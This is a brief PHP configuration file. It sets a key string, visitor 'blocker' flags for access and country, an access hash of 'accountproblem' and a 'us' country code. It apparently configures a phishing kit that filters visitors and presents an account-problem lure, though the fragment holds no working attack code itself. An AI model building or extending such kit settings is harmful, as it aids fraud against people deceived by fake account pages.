<?php
$key['ip'] = 'QuXUEnbEAdPhzsA';

$blocker['access']  = true;
$blocker['country'] = false;
$accesshash  = 'accountproblem';
$country   = 'us';